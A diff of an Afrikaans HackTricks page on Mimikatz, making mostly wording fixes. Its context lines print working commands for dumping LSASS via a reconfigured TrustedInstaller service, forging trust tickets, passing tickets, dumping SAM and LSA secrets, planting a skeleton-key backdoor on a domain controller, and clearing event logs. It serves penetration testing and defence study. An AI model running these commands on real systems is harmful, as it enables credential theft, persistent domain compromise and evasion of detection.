@@ -10,7 +10,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -26,19 +26,19 @@ Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS
 
 ## LM en Duidelike Teks in geheue
 
-Vanaf Windows 8.1 en Windows Server 2012 R2, is beduidende maatreëls geïmplementeer om teen kredietbewysdiefstal te beskerm:
+Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen kredietbewysdiefstal te beskerm:
 
-- **LM hashes en plain-text wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
+- **LM hashes en duidelike teks wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
 
-- **LSA Beskerming** word bekendgestel om die Local Security Authority (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
+- **LSA Beskerming** word bekendgestel om die Plaaslike Sekuriteitsowerheid (LSA) proses te beskerm teen ongemagtigde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
 1. Die registrasie te wysig by _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
-2. 'n Groep Beleid Objekt (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.
+2. 'n Groep Beleidsobjek (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.
 
 Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogs aangeteken sal word.
 
 ### Teenwerking van SeDebugPrivilege Verwydering
 
-Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewyse uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
+Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongemagtigde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewyse uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -56,7 +56,7 @@ Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van
 #### Skoonmaak van Gebeurtenislogs
 
 - **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
-- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit is egter tipies dat gebeurtenislog manipulasie die gebruik van stelsels gereedskap of skripte buite Mimikatz behels om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).
+- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit behels egter tipies die gebruik van stelsels gereedskap of skripte buite Mimikatz om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).
 
 #### Eksperimentele Kenmerk: Patching die Gebeurtenisdienste
 
@@ -106,7 +106,7 @@ Trust Tickets word gebruik om toegang tot hulpbronne oor domeine te verkry deur 
 
 - Opdrag: Soortgelyk aan Golden Ticket, maar vir vertrouensverhoudings.
 - Parameters:
-- `/target`: Die FQDN van die teikendomein.
+- `/target`: Die FQDN van die teiken-domein.
 - `/rc4`: Die NTLM-hash vir die vertrouensrekening.
 
 Voorbeeld:
@@ -121,7 +121,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **Gee die Kas**:
 - Opdrag: `kerberos::ptc`
-- Spuit Kerberos kaartjies in vanaf kaslêers.
+- Spuit Kerberos kaartjies uit kaslêers in.
 - Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Gee die Kaartjie**:
@@ -153,7 +153,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Toegang tot plaaslike SAM databasis.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Ontsleutel geheime wat in die registrasie gestoor is.
+- **LSADUMP::Secrets**: Ontsleutel geheime wat in die register gestoor is.
 - `mimikatz "lsadump::secrets" exit`
 
 - **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.
@@ -167,7 +167,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Privilege Eskalasie
 
 - **PRIVILEGE::Backup**: Verkry rugsteunregte.
 - `mimikatz "privilege::backup" exit`
@@ -175,7 +175,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: Verkry debug regte.
 - `mimikatz "privilege::debug" exit`
 
-### Kredietdumping
+### Krediet Dumping
 
 - **SEKURLSA::LogonPasswords**: Wys krediete vir ingelogde gebruikers.
 - `mimikatz "sekurlsa::logonpasswords" exit`
@@ -204,25 +204,3 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - Trek wagwoorde uit Windows Kluis.
 - `mimikatz "vault::cred /patch" exit`
-
-
-<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry sertifisering:
-
-{% embed url="https://academy.8ksec.io/" %}
-
-{% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
-
-<details>
-
-<summary>Ondersteun HackTricks</summary>
-
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-{% endhint %}
